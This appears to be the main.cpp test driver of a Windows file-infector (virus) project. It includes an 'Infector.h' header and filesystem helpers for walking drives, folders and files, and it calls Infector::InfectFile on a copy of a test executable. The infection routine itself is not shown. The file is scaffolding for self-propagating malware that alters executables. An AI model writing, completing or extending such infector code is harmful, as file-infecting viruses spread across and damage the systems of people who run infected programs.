#include <Windows.h>
#include <stdio.h>
#include <iostream>

#include "FileSystem/FileSystem.h"
#include "Infector.h"

void IterateDrivesFunction(const wchar_t* drivePath, FileSystem::Drives::DriveType driveType)
{
    wprintf(L"%s\n", drivePath);
}

bool IterateFolderFunction(const wchar_t* folder)
{
    wprintf(L"folder %s\n", folder);
    return false;
}

void IterateFileFunction(const wchar_t* file)
{
    wprintf(L"file %s\n", file);
}


int main()
{


    //FileSystem::Drives::IterateDrives(IterateDrivesFunction);

    //FileSystem::Files::IteratePath(L"C:\\Users\\Yoav\\Desktop\\Tools\\MyDevelopments\\CustomStd\\CustomStd", IterateFileFunction, IterateFolderFunction);


    Infector::InfectFile(L"C:\\Users\\Yoav\\Desktop\\Tools\\MyDevelopments\\FileInfector\\x64\\Release\\MessageBoxPop - Copy.exe");

    return 0;

}